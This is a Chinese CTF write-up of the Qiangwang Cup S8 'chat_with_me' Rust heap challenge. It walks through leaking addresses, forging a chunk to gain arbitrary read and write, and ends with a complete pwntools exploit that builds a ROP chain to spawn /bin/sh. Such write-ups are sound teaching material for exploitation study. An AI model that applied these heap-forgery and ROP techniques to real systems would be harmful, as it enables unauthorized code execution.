---
title: 从rust堆看堆块伪造
url: https://forum.butian.net/share/3899
source: 奇安信攻防社区
date: 2024-11-23
fetch_date: 2025-10-06T19:16:57.000896
---

# 从rust堆看堆块伪造

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 从rust堆看堆块伪造

本文章详细分析了强网杯S8的chat\_with\_me这道题，从rust堆看堆块伪造，最后getshell

各个函数功能的测试与分析
============
题目是强网S8的chat\\_with\\_me这道题，看似是个菜单堆，但实际上的add看不出来像常规菜单堆的堆块变化。发现add后然后show时会泄露栈上的数据，所以很容易就得到了pie,heapbase,以及stack地址，这一步很容易发现。
发现是这样的一个结构，\*\*heapaddr存着的是栈地址，然后show的时候是利用\\*(heapaddr)这种方式，也就是解引用再找到存储的栈地址，然后进行leak。\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-f596c4e29b6d0bebb5a5d6f5206664c0afc575fa.png)
然后测试一下edit的功能，\*\*可以看到edit函数中限制是0x50，即使我们输入b'a'\\*0x50，程序也会崩掉，发现edit的最后有个任意地址的free，我们edit偏移为0x20处的那个地方就是free的地址。\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-3559799be135953dc7a7122f703dcc30d4779e40.png)
同时发现edit的数据写到栈上后，同时\*\*会复制到一个0x2010大小的堆块上\*\*，这个堆块比较奇怪，似乎是作为缓冲区。然后\*\*多次add会发现多了个0x50大小的堆块(rust中的vec和c++一样，也是利用realloc来扩展堆块)，这个堆块存的数据还比较重要，存的都是一些栈地址\*\*，根据前面的分析可以猜出这些存的就是对应idx为0,1,2...的地址，\*\*前面说了show和edit都会通过这个堆地址解引用来确定最终show和edit的地址。所以有了一个思路，如果能控制这些堆上存的指针，那么就有了任意地址的写和任意地址的泄露\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-95cf639f699e2ca586a0975e1e278a49b7bcd83c.png)
堆块的伪造与free
==========
根据前面的思路，我们现在想做的就是控制那些堆地址的指针，前面说了我们\*\*可以多次add，然后会申请出0x50大小的堆块，如果这个堆块是我们可控的地址，那不就随便覆盖指针。\*\*
哪里可控呢?
------
当然是刚才说的0x2010大小的堆缓冲区，因为edit时会把数据复制到这个堆缓冲区。\*\*所以如果我们可以将其free掉，然后再多次add，那么就可以申请出的0x50的堆块就会从这个unsorted bin中切割获得，那么我们再进行edit，这个0x50大小的堆块存的数据都可以被我们覆盖!!!\*\*
如果伪造呢?
------
\*\*可以想想free的过程，再来想要满足哪些条件。\*\*
\*\*首先会根据被free的堆块的size的inuse位看看前一个堆块是否被free，如果被free那么将会进行与prev\\_chunk的合并。然后根据其size，利用chunk\\_header+size寻找下一个堆块，判断next\\_chunk的size的inuse位，如果为0，那么将会直接报错，因为这就double free了。\*\*
根据上述分析，我们要满足两个条件，\*\*第一个条件是被free的堆块的size的inuse=1，为了不让其触发和prev\\_chunk的合并导致崩掉\*\*，这很好满足。另一个条件是通过size找到的next\\_chunk的inuse=1，\*\*而正好我们可以发现free的时候，这个0x2010的大堆块后正好有堆块，所以我们只要伪造合适的size让其通过size寻找到的next\\_chunk堆块正好是后面的inuse刚好为1的堆块就可以了\*\*，如果所示。
```python
edit(0,b"a"\*0x20+p64(heapbase+0xaa0+0x30)+p64(0x1fe1))
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-321efc57bf8ae7b38fcd8b29f10949c46e8f6c0c.png)
可以看到伪造的堆块被成功放入unsorted bin
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b348848d0720bab4d41a93c4a87d5433b61aa99b.png)
exp的编写
======
然后进行多次add,申请出0x50大小的堆块。
```python
for i in range(0x4):
add()
```
可以看到\*\*0x5555555baa90是我们那个0x2010大堆块的开始，而从0x5555555baad0开始对应着就是idx为0,1,2...的堆块存着的指针\*\*。由于0x5555555baa90这个地方的unsorted bin是可以通过edit来控制的，所以这里的堆块存着的指针也可以被控制。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7d4b190efa15573e60c69ae34c0998261fda5916.png)
所以利用edit来覆盖指针,这里的p64(stack-0x50)对应idx=0的指针，p64(memcpy\\_got)对应idx=1的指针
```python
memcpy\_got=pie+0x61DF8
edit(0,b"\x00"\*0x30+p64(stack-0x50)+p64(memcpy\_got))
# dbg()
show(1)
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7f945bb64510408884bb9fa7d6135e337c232705.png)
然后show(1)就可以leak出libcbase
```python
show(1)
p.recvuntil("Content: ")
data = p.recvline()
data\_str = data.decode("utf-8")
data\_list = ast.literal\_eval(data\_str)
bytes\_data = data\_list[0:8]
byte\_array = bytes(bytes\_data)
libcbase = struct.unpack("<Q", byte\_array)[0]-0x1988c0
print(hex(libcbase))
```
edit(0)就可以往返回地址写入ROP
```python
pop\_rdi = libcbase+0x000000000010f75b
system = libcbase+libc.sym['system']
binsh = libcbase+next(libc.search(b"/bin/sh"))
ret=libcbase+0x2882f
payload = p64(pop\_rdi)+ p64(binsh) + p64(ret) + p64(system)
edit(0,payload)
```
- 完整exp
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
import ast
import struct
context(os='linux', arch='amd64', log\_level='debug')
p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*$rebase(0x1A8F7)')
# p=remote('0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn',46453)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
#b \*$rebase(0x14F5)
def dbg():
gdb.attach(p,'b \*$rebase(0x3D845)')
pause()
menu='Choice >'
def add():
p.sendlineafter(menu,str(1))
def show(idx):
p.sendlineafter(menu,str(2))
p.sendlineafter('Index >',str(idx))
def edit(idx,cont):
p.sendlineafter(menu,str(3))
p.sendlineafter('Index >',str(idx))
p.sendafter('Content >',cont)
def delete(idx):
p.sendlineafter(menu,str(4))
p.sendlineafter('Index >',str(idx))
add()
# dbg()
show(0)
p.recvuntil("Content: ")
print("----------------")
# data = p.recv(280 - 4)
data = p.recvline()
data\_str = data.decode("utf-8")
data\_list = ast.literal\_eval(data\_str)
print(data\_list)
# 泄露pie
bytes\_data = data\_list[40:48]
byte\_array = bytes(bytes\_data)
pie = struct.unpack("<Q", byte\_array)[0] - 0x0635B0
print(hex(pie))
# 泄露stack
bytes\_data = data\_list[32:40]
byte\_array = bytes(bytes\_data)
stack = struct.unpack("<Q", byte\_array)[0]
print(hex(stack))
# heapbase
bytes\_data = data\_list[8:16]
byte\_array = bytes(bytes\_data)
heapbase = number = struct.unpack("<Q", byte\_array)[0] - 0x002ab0
print(hex(heapbase))
dbg()
edit(0,b"a"\*0x20+p64(heapbase+0xaa0+0x30)+p64(0x1fe1))
for i in range(0x4):
add()
memcpy\_got=pie+0x61DF8
edit(0,b"\x00"\*0x30+p64(stack-0x50)+p64(memcpy\_got))
# dbg()
show(1)
# dbg()
p.recvuntil("Content: ")
data = p.recvline()
data\_str = data.decode("utf-8")
data\_list = ast.literal\_eval(data\_str)
bytes\_data = data\_list[0:8]
byte\_array = bytes(bytes\_data)
libcbase = struct.unpack("<Q", byte\_array)[0]-0x1988c0
print(hex(libcbase))
pop\_rdi = libcbase+0x000000000010f75b
system = libcbase+libc.sym['system']
binsh = libcbase+next(libc.search(b"/bin/sh"))
ret=libcbase+0x2882f
payload = p64(pop\_rdi)+ p64(binsh) + p64(ret) + p64(system)
edit(0,payload)
p.interactive()
```
- 最后在本地打通，远程可能堆布局不太一样要调整一下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-fef627ba9b72719e4f7fb3f97ccc81809544778c.png)
最后的思考
=====
这个题的rust堆非常奇怪，做出这道题几乎是用人工fuzz来测试每个函数的特性，来看发生了什么堆块变化。究其原因还是\*\*rust的代码静态分析难度太大，同时函数包装非常多，没有符号表完全看不出来这个函数有什么作用，只好通过动态调试的方法来根据变化来进行攻击。\*\*
不过rust pwn特点就是这样，静态分析困难，那就多采用动态分析的方法，一步步构造出exp。

* 发表于 2024-11-22 10:00:02
* 阅读 ( 3115 )
* 分类：[二进制](https://forum.butian.net/community/erjinzhi)

0 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![_ZER0_](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/b014225b97f1dc47a9b3be822c3cdb6468cec99.png)](https://forum.butian.net/people/36634)

[\_ZER0\_](https://forum.butian.net/people/36634)

15 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![_ZER0_](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/b014225b97f1dc47a9b3be822c3cdb6468cec99.png)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![](https://shs3.b.qianxin.com/attack_forum/2024/11/qrcode-1cc58d7948a297c338dba7ca92aaf8bbf4843206.jpeg)

---